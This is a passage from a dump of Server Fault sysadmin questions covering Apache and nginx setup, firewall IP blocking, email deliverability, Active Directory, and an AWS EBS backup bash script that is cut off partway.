<p>One solution would be to disable the Mail Delivery System messages at the email-server. However, I think this is not really smart, because sometimes, I would like to receive these error messages, in case they are useful.</p>
","<email><email-server><email-bounces><mail-forwarding>","2016-01-29 09:25:14"
"928625","Allow access to site only by domain name","<p>I have a site that uses an AWS Application load balancer, this load balancer has two dynamic public IPs. Behind the load balancer are a few EC2 instances that server a ruby on rails site using Apache 2.4 as the web server. </p>

<h2>Issue One</h2>

<p>First off, the site can be accessed by the load balancer IPs. The site is mamapedia.com and if you perform a <a href=""https://ipinfo.info/html/ip_checker.php"" rel=""nofollow noreferrer"">reverse domain lookup</a> you can see the load balancer is <strong>ec2-54-241-164-80.us-west-1.compute.amazonaws.com</strong> and the public IPs <strong>52.8.11.9</strong> and <strong>54.241.164.80</strong> (right now, these change).</p>

<p>What is the standard for handling direct IP access? Should I reroute the IP traffic to the domain? Or should I block traffic on all IPs? Note the IPs are not static so really I'm asking what should be done with all IP addresses trying to access the site? Further, where should this be configured? On the load balancer, Apache or somewhere else? If Apache, what should this look like?</p>

<h2>Issue two</h2>

<p>This is somewhat related to the first issue but may require a different solution. The site in question mamapedia.com should also only accept traffic from the domain mamapedia.com and no others. This in not currently the case.</p>

<p>A google search of <strong>site:mamapedia.com</strong> returned results for another domain <em>bcphotography.co.nz</em> Example. Mamapedia™ - BC Photography New Zealand</p>

<p>If you click through the link, you are redirected to mamapedia.com as you would expect, however google is indexing BC Photography New Zealand. Digging deeper, the site <a href=""http://www.bcphotography.co.nz/"" rel=""nofollow noreferrer"">http://www.bcphotography.co.nz/</a> if searched in the reverse domain lookup resolves to the mamapedia load balancer and public IPs. This indicates that domain has the mamapedia load balancer set in its DNS records. Further if you try accessing the domain bcphotography.co.nz you can insecurely access mamapedia on that domain name.</p>

<p>This is definitely not desired, and I need to know how to prevent it. The only time the mamapedia site should be accessed is on the <a href=""https://www.mamapedia.com"" rel=""nofollow noreferrer"">https://www.mamapedia.com</a> domain. What are the standard rules for configuring a web server in this way? </p>

<p>What is the standard for handling traffic from another domain that has DNS records that resolve to your site ( bcphotography.co.nz ) Should that redirect to <a href=""https://www.mamapedia.com"" rel=""nofollow noreferrer"">https://www.mamapedia.com</a> or should it be blocked? What is best for google indexing, I want to avoid google indexing anything other then mamapedia information for mamapedia.com</p>

<p>I have seen some sites redirect their public IPs to their host and others that block the IPs, what are the pros and cons of each way? Which is better?</p>
","<domain-name-system><amazon-web-services><apache-2.4><ip><amazon-elb>","2018-08-29 22:11:45"
"928699","MySQL, possible to prevent two fields to be NULL or NOT NULL?","<p>a simple table:</p>

<pre><code>ID, NAME, POST_ID, GROUP_ID
</code></pre>

<p>either POST_ID or GROUP_ID must be set, but never both of them, NEITHER none of them. So,</p>

<p>there are valid cases:</p>

<pre><code>ID, NAME, POST_ID, GROUP_ID
x,   y,   1,       NULL
x,   y,   NULL,    4
</code></pre>

<p>and NOT VALID cases:</p>

<pre><code>ID, NAME, POST_ID, GROUP_ID
x,   y,   NULL,    NULL
x,   y,   4,       4
</code></pre>

<p>is it possible to set such complicated restriction rule?</p>
","<mysql><restriction><foreign-key>","2018-08-30 12:20:46"
"752836","iLO and server through same external IP","<p>I have a HP ProLiant server which supports iLO. Also I have some services running on that server. Now, I only have one external IP address available, initially I wanted to use that IP address for a VPN to my server, but I cannot create to a server that is for example turned off. Does anybody have a proper solution for me of how I can fix this?</p>

<p>Thanks </p>
","<vpn><ilo>","2016-01-30 10:21:33"
"928826","geoip block/ mass ip blocks in windows firewall","<p>i got issue with ransomware attacks day and night from Russia/Ukraine...</p>

<p>even with secure rdp some of them get passes now and then and make me suffer...</p>

<p>so i want to block geo block whole Russia/Ukraine till Microsoft actually think of something and patch this issue...</p>

<p>there is no GeoBlock as far as i know in firewall</p>

<p>so i downloaded <a href=""http://www.ipdeny.com/ipblocks/"" rel=""nofollow noreferrer"">http://www.ipdeny.com/ipblocks/</a> ip's based by country</p>

<p>i know this command netsh advfirewall firewall set rule name = "" .....</p>

<p>but it only add up to thousand ip's  and if i re run it for next thousand it delete previous batch and replace it with new ones...</p>

<p>i saw some netsh advfirewall firewall add rule name = ""</p>

<p>but couldn't figure it out what do i misses to make it work </p>

<p>here is the sample i run</p>

<p>C:\Users\User>netsh advfirewall firewall add rule name = ""RussiaOutBlock"" new remoteip = ""2.16.159.0/255.255.255.0""
One or more essential parameters were not entered.
Verify the required parameters, and reenter them.</p>

<p>i appreciate insight on this matter of if there is easier way to solve this problem</p>

<p>thank you</p>
","<windows><windows-firewall>","2018-08-31 06:20:55"
"928851","Fallout from apparent dos attack - httpd trying to contact attacker","<p>I have a server running multiple web hosts (all internally managed) which was the subject of what looked like a dos attack last night. I blocked the attacking IP in IPTABLES for both input and output chains.  That seemed to solve the problem and I went home.</p>

<p>This morning the server died again - this time it seems from netstat that it was sending multiple SYN's to the attacking IP.  <em>Obviously</em> they were dropped by IPTABLES OUTPUT chain, but there were so many in the stack that it failed.  </p>

<p>I am worried that the server is sending syn's to the attacker. Presumably it's trying to establish a new outbound connection to the attacker IP on port 80, but why?  Does this mean the server is compromised?  How can I find what is causing this?  I have tried netstat -p but it just shows the owner of the outgoing attempts as httpd.</p>

<p>There are some big sites in the web directory so my attempt at grep'ing for the attacker IP in all the web files would take days.  </p>

<p>What to do?</p>

<p>Many thanks in advance....</p>
","<httpd><ddos><syn>","2018-08-31 09:43:06"
"928954","When is an email rejected by the receiving server?","<p>Currently, I am working on a web application and wanted to create a web form to let users write emails through it. So, they would have to set their email address and the message and after clicking ""Submit"" my web application would send the email to recipients using their email address in the <code>FROM</code> header. The sending process is, of course, done using my own SMTP service because I do not have access to the email servers from my website visitors.</p>

<p>Now, I heard that this is probably a bad idea because those emails will most likely be rejected by the servers of the recipients. However, I do not yet fully understand why that is and how this process works. I've learned that the two most used anti-spam and -spoofing technologies used today for email is <a href=""https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail"" rel=""nofollow noreferrer"">DKIM</a> and <a href=""https://en.wikipedia.org/wiki/Sender_Policy_Framework"" rel=""nofollow noreferrer"">SPF</a>.</p>

<p>So, I'd like to understand why exactly the emails will be rejected and how DKIM/SPF will help here.</p>

<p>So, let's start with SPF:</p>

<p>As far as I understand, the server of the recipient will check the IP addresses that are allowed to send mails using the domain in the <code>MAIL_FROM</code> header and the DNS system. Now, with my example above, when I send emails in the web application with the <code>FROM</code> header set to e.g. <code>bob@example.com</code> (that's the address my website visitor set) this should (?) not affect the <code>MAIL_FROM</code> header. Because the email will be sent through my email service, the <code>MAIL_FROM</code> header will contain my domain and as far as I understand, it should be possible to send the mail and passing SPF.</p>

<p>The other anti-spam technology is DKIM:</p>

<p>It will sign the email and the recipient server will look in the DNS to find the right public key to verify the signature. Here, I am not sure how that's done exactly. I know that the <code>FROM</code> header will be part of the signature, but how does the recipient server check DKIM? Is it looking again at the DNS from the <code>MAIL_FROM</code> header? If yes, I could also pass DKIM with my example above, is that right? Or do have the domain in <code>MAIL_FROM</code> and <code>FROM</code> be identical? I'm kind of lost.</p>

<p>So after all I understand now, both DKIM and SPF should not be a problem for my web application. Why, though, is it sill said to be a bad idea and emails will most likely be rejected? Or did not I understand DKIM properly?</p>

<p>My overall question:
How exactly will the recipient server determine if the email is rejected?</p>
","<security><spam>","2018-09-01 07:46:35"
"753097","How to resolve hostnames from a intranet interface?","<p>I have a public IP and some hostnames pointing to it, on this public IP server I have others intranet interfaces running <strong>apache virtual hosts servers</strong>, my question is how can I forward external requests to this interfaces?</p>

<p>On a simple apache virtual hosts running in the public IP machine I can easy do that editing <code>/etc/hosts</code> this way</p>

<pre><code>127.0.0.1 mysite.com
127.0.0.1 blog.mysite.com
</code></pre>

<p>But by some motive it not work with intranet interfaces</p>

<pre><code>172.17.0.1 mysite.com
172.17.0.2 blog.mysite.com
172.17.0.2 news.mysite.com
</code></pre>

<p>ps: A apache server is running on each IP</p>

<p>I simple get <code>ERR_CONNECTION_REFUSED</code>, if a ping it I get the server IP, so the public DNS are working</p>

<p>Can you help me?</p>
","<apache-2.2><virtualhost>","2016-02-01 02:48:59"
"929083","How can I allow packet forwarding via Windows Firewall?","<p>In the Linux I can use iptables for enable forwarding: </p>

<pre><code>~ # iptables -I FORWARD -j ACCEPT
</code></pre>

<p>But how can I realize the same function in Windows? </p>
","<windows><firewall>","2018-09-02 16:46:00"
"753173","apache https applies to other http vhosts","<p>I've searched a lot, i also tried lots of thing but still cannot find the problem.</p>

<p>I have an apache 2.2.22 server installed on an ubuntu server 12.04 lts.
I have a number of http virtual hosts and 2 https vhosts. Everything works fine, but the strange thing is that if i give on my browser one of my http sites, with https instead, it redirects me to the actual https site. This is very awkward an i really don't know what is causing it.</p>

<p>Has anyone faced that too? and can you help with this? Thanks in advance</p>
","<apache-2.2><virtualhost><https>","2016-02-01 11:28:25"
"929163","Is it possible for packets sent using TCP to ever arrive with different data?","<p>Sometimes in my networking library when I send a packet the data arrives different than when I sent it. I assumed that TCP guarenteed exact delivery. Is this true? Or must there be something wrong in the packaging and receiving process of my own library code?</p>
","<networking><tcp><package-management>","2018-09-03 08:52:38"
"753272","Active Directory Authentication from the Internet","<p>I need some help finding a good solution to this problem. I know AD just fine, but admittedly, I'm not an expert. And I know I don't want to expose it to the internet...</p>

<p>I inherited a workforce at my new company (~100 employees, all Mac) that often work remote. Every laptop authenticates to the Active Directory. Works great(ish). 
However, when users go remote, they sometimes need to leave their laptop with another employee that doesn't have a laptop (for reasons). The problem is that employee 2 can't login to employee 1's laptop because the computer cannot contact the AD. There are no cached creds for employee 2 because its the first time he's logged in to this particular machine.</p>

<p>Normally VPN is the solution, but without being able to login to the computer first, you can't login to the VPN. Are there any solutions that I should look into not involving persistent VPN to help with this? I don't want to expose AD or LDAP to the wider internet, but the bottom line is that I need to be able to authenticate from there without VPN.</p>

<p>Also, just to add a layer of complexity on top of this...the domain I inherited is a ""domain.local"" Not too big of an issue (I can work around some of the normal mac problems), however I see this causing an issue when trying to contact dc.domain.local from the internet.</p>

<p>Can anyone smarter than me point me in the right direction for a solution (without a lecture on bad practice, etc)?</p>
","<active-directory><mac-osx><internet>","2016-02-01 18:44:22"
"929265","Fixing a server that has been listed an Email Spam","<p>Full Disclosure: Setup of email servers is something fairly new to me, so go easy on me :)</p>

<p>Recently users reported that they were not receiving emails from my site. The site runs a vbulletin forum so the emails are things like subscription notifications etc.</p>

<p>After doing a little digging I have found two issues, that I am not certain how to fix:</p>

<p>Issue #1
According to this:</p>

<p><a href=""https://mxtoolbox.com/SuperTool.aspx?action=smtp%3a77.68.13.98&amp;run=toolpage#"" rel=""nofollow noreferrer"">https://mxtoolbox.com/SuperTool.aspx?action=smtp%3a77.68.13.98&amp;run=toolpage#</a></p>

<p>The SMTP banner check fails as ""Reverse DNS does not match SMTP Banner"".  As I understand it some mail server will rDNS check the sender and reject if there is not match. However, I have no idea how to resolve this.</p>

<p>Issue #2
Checking /var/log/maillog I am seeing quite a few entries that a similar to this:</p>

<blockquote>
  <p>Sep  3 03:39:00 mail postfix/smtp[48940]: 53D9554E2C: host
  mx.mnd.ukmail.iss.as9143.net[212.54.58.11] refused to talk to me: 550
  mx6.mnd.ukmail.iss.as9143.net mx6.mnd.ukmail.iss.as9143.net
  logid=SMTPRC 550 MXIN102 Your IP 77.68.13.98 is in RBL. Please see
  <a href=""https://www.spamhaus.org/query/ip/77.68.13.98"" rel=""nofollow noreferrer"">https://www.spamhaus.org/query/ip/77.68.13.98</a> 
  ;id=wfhofcY9kJpgl;sid=wfhofcY9kJpgl;mta=mx6.mnd;d=20180903;t=053912[CET];ipsrc=77.68.13.98;</p>
</blockquote>

<p>From this it seems that the server IP has been blacklisted, following the spamhaus link in the maillog entry led me to:</p>

<p><a href=""https://www.abuseat.org/lookup.cgi?ip=77.68.13.98"" rel=""nofollow noreferrer"">https://www.abuseat.org/lookup.cgi?ip=77.68.13.98</a></p>

<p>This gave me the option to remove the listing</p>

<p>So, my somewhat vague and inexperienced question is what do I need to do to fix this?</p>
","<email><blacklist>","2018-09-03 19:12:38"
"929345","How can I limit bandwidth on a public network?","<p>Our workplace has a public network where people often connect with their personal laptops. A sizeable number of users are torrenting which is killing bandwidth for the rest of the network's users.</p>

<p>At this time, a policy solution of 'no torrenting' is infeasible so a technical solution is preferable.</p>

<p>Is there way of limiting bandwidth usage of all users?</p>

<p>And, if there are solutions, is there a software solution for Windows Server 2008?</p>
","<networking><windows-server-2008-r2><bandwidth><bandwidth-control><torrent>","2018-09-04 09:28:34"
"929356","Failed to start postgres database","<p>I tried to restart Postgres database. Then it shows an error.</p>

<pre><code> * Starting PostgreSQL 9.5 database server                                                                                                       
 * The PostgreSQL server failed to start. Please check the log output:
   2018-09-04 10:37:05 UTC [2573-1] FATAL:  could not create lock file ""postmaster.pid"": Permission denied
                                                                                                                                     [fail]
</code></pre>

<p>More than 4 applications running on this test server. I need a fix for this issue.  </p>
","<postgresql><ubuntu-16.04>","2018-09-04 10:44:11"
"929415","block Certificate authority server","<p>is this possible to block a specific TLS CA(certificate authority) on network ?
for example block all certs that is issued by letsencrypt on my network
is there any ip or host name for blocking ?</p>
","<ssl><certificate><certificate-authority>","2018-09-04 16:13:15"
"929533","use VirtualHost *:443 as default for all unmatched ServerAlias","<p>My apache is configured to use multiple VirtualHosts: </p>

<ul>
<li>default-ssl.conf for mydomain.tld and www.mydomain.tld and</li>
<li>subdomain-le-ssl.conf for subdomain.mydomain.tld</li>
</ul>

<p>default-ssl.conf:</p>

<pre><code>&lt;IfModule mod_ssl.c&gt;
    &lt;VirtualHost *:443&gt;
            ServerAdmin my@mail
            ServerName mydomain.tld
            ServerAlias www.mydomain.tld
            DocumentRoot /var/www/html

            &lt;Directory /var/www/html&gt;
              # directory stuff
            &lt;/Directory&gt;

            # ssl stuff
    &lt;/VirtualHost&gt;
&lt;/IfModule&gt;
</code></pre>

<h1>Problem</h1>

<p>If someone has a typo in <code>subdomain</code> (i.e. <code>curl https://subdonain.mydomain.tld</code>), he gets a <code>503 Service Unavailable</code> which is confusing. I would like to serve the default-ssl.conf VirtualHost in this case.</p>

<p>In my VirtualHost config for *:80 i removed ServerName and ServerAlias to address this issue, and it works as intended. But when i do the same in default-ssl.conf i get error 503 for every https request. </p>

<p>How do i configure my *:443 Hosts to behave like the *:80 Hosts in that regard?</p>

<h1>Second Thoughts</h1>

<p>Accessing mydomain.tld with an unknown subdomain will result in HTTPS cert errors. But i like an cert error better than Service Unavailable. </p>

<p>In my environment i have to fall back to doing my http(s) requests via IP occansionally because there is no domain available. But this requires the server to respond even if the ServerAlias is not set, which does not work. Editing /etc/hosts on clients is not an option, because those may be iphones/windows pcs and most certainly not developers.</p>

<p>I could fall back to using http on *:80 again, but i don't want that, because it would mean disabling the rewrite rule to https - which is bad practice. </p>

<p>I tried setting the <code>ServerAlias *</code> in default-ssl.conf which redirects everything to default-ssl.conf, but this means i can't access subdomain.mydomain.tld anymore. </p>
","<apache-2.4><ubuntu-16.04>","2018-09-05 09:42:25"
"929593","Unix ACLs - After Applying, normal permissions are wrong","<p>I have a problem when using ACLs</p>

<p>I have one file</p>

<pre><code>-rw-r----- 1 syslog adm 0 Sep  5 17:53 postfix_exporter_input.log
</code></pre>

<p>The permissions 0640 are correct and they need to stay like this. Now I want to apply an ACL, that allows a single user to read and write to that file. So I write:</p>

<pre><code>setfacl -m u::rw,g::r,o::-,u:postfixexporter:rw postfix_exporter_input.log
</code></pre>

<p>getfacl now outputs the following, which is actually correct:</p>

<pre><code># file: postfix_exporter_input.log
# owner: syslog
# group: adm
user::rw-
user:postfixexporter:rw-
group::r--
mask::rw-
other::---
</code></pre>

<p>However, when I do a normal ls on that file, I get the following:</p>

<pre><code>-rw-rw----+ 1 syslog adm 0 Sep  5 18:01 postfix_exporter_input.log
</code></pre>

<p>Why did the permissions change to group:rw ?</p>
","<linux><ubuntu><access-control-list>","2018-09-05 16:02:57"
"929641","OpenVPN work in China","<p>Next week, I'm going to China to work, and I'm worried about the connections there. To prevent this, I installed and configured OpenVPN on an EC2 instance in AWS. I'm navigating it right now.
My EC2 is in Virginia and my traffic is masked in California.
Does this mean I can access my gmail, whatsapp, google and etc ...?</p>
","<amazon-ec2><openvpn>","2018-09-05 22:28:29"
"929684","Which Disk to replace first ? Predictive Failure or Failed Disk","<p>We have a HPDL380 G6 server ( running 2003 R2) with 1 failed disk and 1 predictive failure.</p>

<p>Total 4 Disks configured with RAID5. </p>

<p>I will be replacing disks, <strong>Now question is which disk should I replace first and why ?</strong></p>

<p>Thank You
JP</p>
","<windows-server-2003><raid5><diskmanagement>","2018-09-06 09:02:27"
"929840","How to restart linux services if it reaches 100% CPU?","<p>I have postfix email server with saslauthd. Time and again saslauthd daemon eats 100% CPU. Restarting these services returns to normal cpu usage.</p>

<p>Is there any proper script to determine services with high CPU usage and restart it automatically.</p>

<p>Thanks in advance.</p>
","<linux><cpu-usage><kill><saslauthd>","2018-09-07 07:31:55"
"929845","HP Proliant DL580 G5 Server Initial Setup","<p>I am a beginner so please bear that in mind if you choose to answer the question.</p>

<p>I have a HP Proliant Dl580 G5 with the following specs :
4x Six-Core XEON 2.4GHz E7450
128GB RAM<br>
4x 72GB SAS 15K</p>

<p>I was wondering how i can go about installing or hosting 
4 Ubuntu Server OS running concurrently on it? 
ie Virtualization ? or Via KVM ?
Also If i should look into Xen or some other medium to make such a system possible. </p>

<p>Thank you in advance for your time and patience.  </p>
","<ubuntu><operating-system><server-setup>","2018-09-07 08:21:55"
"929898","Ansible best practise - multiple administrators","<p>Didnt find anywhere what is best practise for using Ansible by multiple administrators. We would like to login with SSH keys to both control machine and remotes.</p>

<p>Is the best way to do this:</p>

<ol>
<li><p>Create every administrator his own account at control machine and then just use BECOME to SSH to remote hosts with one general account with sudo rights on remotes? With this solution only private key stored at control machine would be one for general user.</p></li>
<li><p>Create own account for every administrator on control and remote machines and let them SSH to remotes with their own account? This solution basicly means, we would have to store private keys for each administrator at control machine.</p></li>
</ol>

<p>Thank you for your help.</p>
","<ansible>","2018-09-07 13:12:44"
"929921","is Xampp enough For a School Local Web Server?","<p>So Guys I'm trying to build a website for my school but can be access with no internet cause i will be running it on a virtual host using xampp so if students connect to the router where i run my web server ( Xampp virtual Host ) They can connect and use it for Chatting see latest announcements and share files with others my question is Is Xampp enough for this? and what are the problems i might encounter in the future btw the students enrolled is somewhere 10k - 15k students can a single Xampp Virtual Host handle that? i need tips from you guys to make this work locally offline</p>

<p>btw this is my plan a inforgraph so you guys can understand what I meant,
<a href=""https://i.sstatic.net/KrQh5.jpg"" rel=""nofollow noreferrer"">here</a></p>
","<php><web-server><xampp><local>","2018-09-07 14:28:38"
"929954","How can you prevent X-Forwarded-For spoofing on haproxy?","<p>Is there a way to prevent the X-Forwarded-For from being spoofed in haproxy?</p>

<p>i.e. Can I rename that header to something else? Or is there another way to forward on the correct IP address of the client?</p>
","<ip><haproxy>","2018-09-07 19:23:50"
"929989","NGINX server license costs","<p>NGINX server is under the BSD license. Does anyone know how to find information about the costs of BSD license, I mean, how much is paid to apply this license to NGINX, and how much does a user has to pay that goes to the license usage, when using NGINX (even if it's near zero cost)?</p>
","<nginx>","2018-09-08 00:26:01"
"930123","Wordpress security issue in nginx","<p>I installed wordpress latest version in Ubuntu 16.04 with nginx. But after some days of installation I see some unknown file in root directory.<a href=""https://i.sstatic.net/6Zc3d.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/6Zc3d.png"" alt=""enter image description here""></a></p>

<p>like <code>alias99.php</code>. How to prevent/block this. I already add </p>

<pre><code>location ~ /\. {
    deny all;
}

location ~ ^/wp-content/uploads/.*\.php$ {
    deny all;
}

location ~* /(?:uploads|files)/.*\.php$ {
    deny all;
}
</code></pre>

<p>in conf file. How can ensure security level. Thank you.</p>
","<nginx><security><wordpress>","2018-09-09 12:32:04"
"850985","Server specs for big ChatBot launch?","<p>We're releasing a Messenger Platform ChatBot on a page with approx. 130k fans soon. At the moment we host on an EC2 instance with 2 Cores and 4GB RAM, which runs smoothly with our 30 users atm.</p>

<p>Our tech stack is:</p>

<p>NGINX
gunicorn (4 workers)
Flask-framework
DB is separated on amazon RDS (Postgres)</p>

<p>Do you think our server can handle the first wave of requests after launch? Can't imagine how big this is going to be.</p>

<p>Any advice regarding hardware? Should be switch to a bigger instance or maybe Use the AWS loadbalancer to spin up a second instance on heavy load?</p>

<p>Thanks in advance!</p>
","<nginx><amazon-ec2><flask><requests>","2017-05-18 20:24:07"
"850995","10 questions about active directory :)","<p>I am setting up a network with about 20 computers, 10 servers and 3 printers. But there are quite a few things Im not sure about. So here goes... </p>

<ol>
<li><p>I have read that it's good practice to have two domain controllers on a network. Is this still true for a small network that won't have much impact if the server is down? </p></li>
<li><p>Can active directory be used to deploy Windows assuming the PC'S support network boot? </p></li>
<li><p>Are users files stored locally or on the domain controller? And is there a feature that allows you to centralise, say the documents folder on a file server? </p></li>
<li><p>Is there an option that allows you to let the user login if the server is down? </p></li>
<li><p>Does the server CPU power matter (within reason) or will a slower CPU increase login times? </p></li>
<li><p>Can software be installed on all computers remotely if it has an automatic installer or script? </p></li>
<li><p>Is there anything that allows you to have groups or roles to give users different privileges? </p></li>
<li><p>Does Active Directory have any sort of ""web api""  so that it can be tied with a separate web based user management system? </p></li>
<li><p>Can all or most Active Directory settings and features be accessed via CMD or Power Shell? </p></li>
<li><p>Can windows licencing be manged as per computer (not a group licence) as in each copy of Windows was purchased separately with its own key?</p></li>
</ol>

<p>Thanks in advance. </p>
","<active-directory><domain-controller><internal-dns>","2017-05-18 21:33:27"
"930166","How to connect to local servers by hostname?","<p>I have a Ubuntu server and Centos server installed on VMware on my Windows 10 PC for testing. I don't have any domain names registered and using cable internet so my IP is dynamic.</p>

<p>Centos server's /etc/hostname contains the line centos1.local
Ubuntu server's /etc/hostname contains the line ubunto1.local</p>

<p>When I try ssh ubunto1.local from the Centos server it says unable to resolve hostname. How do I ping/connect to the other server by its hostname? I am able to ping by internal IP.</p>
","<domain-name-system><linux-networking><internal-dns>","2018-09-09 23:17:44"
"851036","Linux DHCP server vs windows DHCP server","<p>I planned to install DHCP server into the Linux or Ubuntu machine for learning purpose, I just want to know difference between them and linux DHCP server suitable for managing 100 to 200 employees in organization.?</p>
","<linux-networking><dhcp-server>","2017-05-19 05:23:54"
"753743","2000 member server, 2003 FFL/DFL, only 2012 DC","<p>I have a 2000 member server in a 2003 FFL/DFL domain with a 2003 DC.  I'm hoping to stand up a new 2012R2 DC, transfer fsmo roles and demote the 2003DC.  </p>

<p>If I keep the FFL/DFL at 2003, will the 2000 member server still be able to authenticate once I only have 2012 DCs?</p>
","<active-directory>","2016-02-03 14:50:05"
"851049","www.softwarecollections.org is down - is there an alternative","<p>I've a centos based installation with php-56 installed from this repository. 
It looks like this site is down.</p>

<p>Any idea where can I find a mirror or replacement ? </p>

<p>it looks like instead of looking for another mirrors yum just keep hitting the same site again and again:</p>

<blockquote>
  <p><a href=""https://www.softwarecollections.org/repos/remi/php56more/epel-7-x86_64/repodata/repomd.xml"" rel=""nofollow noreferrer"">https://www.softwarecollections.org/repos/remi/php56more/epel-7-x86_64/repodata/repomd.xml</a>: [Errno 12] Timeout on <a href=""https://www.softwarecollections.org/repos/remi/php56more/epel-7-x86_64/repodata/repomd.xml"" rel=""nofollow noreferrer"">https://www.softwarecollections.org/repos/remi/php56more/epel-7-x86_64/repodata/repomd.xml</a>: (28, 'Connection timed out after 30000 milliseconds')
  Trying other mirror.
  <a href=""https://www.softwarecollections.org/repos/remi/php56more/epel-7-x86_64/repodata/repomd.xml"" rel=""nofollow noreferrer"">https://www.softwarecollections.org/repos/remi/php56more/epel-7-x86_64/repodata/repomd.xml</a>: [Errno 12] Timeout on <a href=""https://www.softwarecollections.org/repos/remi/php56more/epel-7-x86_64/repodata/repomd.xml"" rel=""nofollow noreferrer"">https://www.softwarecollections.org/repos/remi/php56more/epel-7-x86_64/repodata/repomd.xml</a>: (28, 'Connection timed out after 30001 milliseconds')
  Trying other mirror.</p>
</blockquote>
","<centos><yum>","2017-05-19 07:02:58"
"753744","Active directory overwriting existing computers","<p>while adding another user with same computer name active directory i overwriting old one. Is there any way to prevent this? </p>

<p>I mean can i get some message or access denied when i try to add second computer with the same computer name as other that is already in active directory?</p>
","<active-directory>","2016-02-03 14:53:21"
"851106","Result of move folder with NTFS permissions - Windows 2003 server","<p>Let's say we have this situation:</p>

<p>On a Windows 2003 file server, the following structure is present:</p>

<p>\fileserver\folder1\subfolder1
Which has NTFS access permissions for UserA</p>

<p>\fileserver\folder2\ 
Which has NTFS access permissions for UserB</p>

<p>If I just simply move \fileserver\folder1\subfolder1 to  \fileserver\folder2\subfolder1 what happens to the permissions ?</p>

<p>Will UserA still have their permissions to the 'subfolder1' location or will the permissions change to UserC and UserD ?</p>

<p>How can I make this move, but keep initial permissions ?</p>
","<windows><permissions><file-server>","2017-05-19 11:49:39"
"851191","Vmware EULA - Essentials and vSphere Standard same site","<p>Can a company run a vSphere Essentials cluster and maintain a vSphere Standard cluster at the same time and still be in license compliance in the VMware EULA?</p>

<p>No requirement for all hosts to be managed by one vCenter server.</p>
","<vmware-esxi><vmware-vsphere><licensing>","2017-05-19 18:39:32"
"851209","copying iptables to ip6tables","<p>Is it possible to copy the iptables ipv4 rules to iptables ipv6? I already tried to just copy them to ipv6, but it doesn't really work. Most outgoing and incoming connections doesn't work. Maybe there are some problems about ipv4 addresses like localhost or cloudflare ip's</p>

<p>My ipv4 settings: <a href=""https://hastebin.com/otayisaroj"" rel=""nofollow noreferrer"">https://hastebin.com/otayisaroj</a></p>
","<debian><iptables><ipv6>","2017-05-19 21:27:10"
"930413","How to identify a domain controller by scanning a bunch of IP addresses?","<p>I am looking for a way to determine what Ip addresses are acting as domain controllersin my network of arount 100,000 IP addresses. The main goal is to scan all of the machines and once I identify the machines that are acting as domain controller, we will figure out what users are connected to it. I can't runany WMI queries to any of the IP addresses. All I can do is scan my full network. So, is there any distinguish factor in a machine/Ip address that a domain controller have and a normal workstation or a member workstation don't have? Thanks</p>
","<domain-name-system><active-directory><entra-id>","2018-09-11 12:52:39"
"753958","$0 empty in script when run by cronjob","<p>I am trying to setup automated backups for an AWS EBS volume and using <a href=""https://github.com/colinbjohnson/aws-missing-tools/tree/master/ec2-automate-backup"" rel=""nofollow noreferrer"">https://github.com/colinbjohnson/aws-missing-tools/tree/master/ec2-automate-backup</a> to do so.</p>

<p>The backup script used is the following (ec2-automate-backup.sh)</p>

<pre><code>#!/bin/bash -
#confirms that executables required for succesful script execution are 
available
prerequisite_check() {
  for prerequisite in basename cut date aws; do
    #use of ""hash"" chosen as it is a shell builtin and will add programs to hash table, possibly speeding execution. Use of type also considered - open to suggestions.
    hash $prerequisite &amp;&gt; /dev/null
    if [[ $? == 1 ]]; then #has exits with exit status of 70, executable was not found
      echo ""In order to use $app_name, the executable \""$prerequisite\"" must be installed."" 1&gt;&amp;2 ; exit 70
    fi
  done
}

#get_EBS_List gets a list of available EBS instances depending upon the selection_method of EBS selection that is provided by user input
get_EBS_List() {
  case $selection_method in
    volumeid)
      if [[ -z $volumeid ]]; then
        echo ""The selection method \""volumeid\"" (which is $app_name's default selection_method of operation or requested by using the -s volumeid parameter) requires a volumeid (-v volumeid) for operation. Correct usage is as follows: \""-v vol-6d6a0527\"",\""-s volumeid -v vol-6d6a0527\"" or \""-v \""vol-6d6a0527 vol-636a0112\""\"" if multiple volumes are to be selected."" 1&gt;&amp;2 ; exit 64
      fi
      ebs_selection_string=""--volume-ids $volumeid""
      ;;
    tag)
      if [[ -z $tag ]]; then
        echo ""The selected selection_method \""tag\"" (-s tag) requires a valid tag (-t Backup,Values=true) for operation. Correct usage is as follows: \""-s tag -t Backup,Values=true.\"""" 1&gt;&amp;2 ; exit 64
      fi
      ebs_selection_string=""--filters Name=tag:$tag""
      ;;
    *) echo ""If you specify a selection_method (-s selection_method) for selecting EBS volumes you must select either \""volumeid\"" (-s volumeid) or \""tag\"" (-s tag)."" 1&gt;&amp;2 ; exit 64 ;;
  esac
  #creates a list of all ebs volumes that match the selection string from above
  ebs_backup_list=$(aws ec2 describe-volumes --region $region $ebs_selection_string --output text --query 'Volumes[*].VolumeId')
  #takes the output of the previous command 
  ebs_backup_list_result=$(echo $?)
  if [[ $ebs_backup_list_result -gt 0 ]]; then
    echo -e ""An error occurred when running ec2-describe-volumes. The error returned is below:\n$ebs_backup_list_complete"" 1&gt;&amp;2 ; exit 70
  fi
}

create_EBS_Snapshot_Tags() {
  #snapshot tags holds all tags that need to be applied to a given snapshot - by aggregating tags we ensure that ec2-create-tags is called only onece
  snapshot_tags=""Key=CreatedBy,Value=ec2-automate-backup""
  #if $name_tag_create is true then append ec2ab_${ebs_selected}_$current_date to the variable $snapshot_tags
  if $name_tag_create; then
    snapshot_tags=""$snapshot_tags Key=Name,Value=ec2ab_${ebs_selected}_$current_date""
  fi
  #if $hostname_tag_create is true then append --tag InitiatingHost=$(hostname -f) to the variable $snapshot_tags
  if $hostname_tag_create; then
    snapshot_tags=""$snapshot_tags Key=InitiatingHost,Value='$(hostname -s)'""
  fi
  #if $purge_after_date_fe is true, then append $purge_after_date_fe to the variable $snapshot_tags
  if [[ -n $purge_after_date_fe ]]; then
    snapshot_tags=""$snapshot_tags Key=PurgeAfterFE,Value=$purge_after_date_fe Key=PurgeAllow,Value=true""
  fi
  #if $user_tags is true, then append Volume=$ebs_selected and Created=$current_date to the variable $snapshot_tags
  if $user_tags; then
    snapshot_tags=""$snapshot_tags Key=Volume,Value=${ebs_selected} Key=Created,Value=$current_date""
  fi
  #if $snapshot_tags is not zero length then set the tag on the snapshot using aws ec2 create-tags
  if [[ -n $snapshot_tags ]]; then
